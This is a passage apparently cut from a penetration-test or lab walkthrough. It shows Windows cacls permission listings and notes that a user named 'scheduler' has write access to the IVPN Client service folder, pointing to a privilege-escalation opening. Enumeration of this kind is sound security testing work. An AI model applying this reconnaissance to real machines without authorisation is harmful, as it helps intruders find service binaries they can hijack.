                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                GENERIC_READ
                                                                                                GENERIC_EXECUTE
 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                           GENERIC_READ
                                                                                                           GENERIC_EXECUTE

But on the IVPN Service, we find that a user named "scheduler" has Write access

c:\Program Files\IVPN Client>cacls "c:\program files\IVPN Client"
cacls "c:\program files\IVPN Client"
c:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)
                                                      READ_CONTROL
                                                      SYNCHRONIZE
                                                      FILE_GENERIC_READ
                                                      FILE_GENERIC_WRITE
                                                      FILE_GENERIC_EXECUTE
                                                      FILE_READ_DATA
                                                      FILE_WRITE_DATA
                                                      FILE_APPEND_DATA
                                                      FILE_READ_EA
                                                      FILE_WRITE_EA
                                                      FILE_EXECUTE
                                                      FILE_READ_ATTRIBUTES
                                                      FILE_WRITE_ATTRIBUTES
 
                             NT SERVICE\TrustedInstaller:(ID)F 
                             NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                             NT AUTHORITY\SYSTEM:(ID)F 
                             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Administrators:(ID)F 
                             BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Users:(ID)R 
                             BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                           GENERIC_READ
                                                           GENERIC_EXECUTE
 
                             CREATOR OWNER:(OI)(CI)(IO)(ID)F 
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
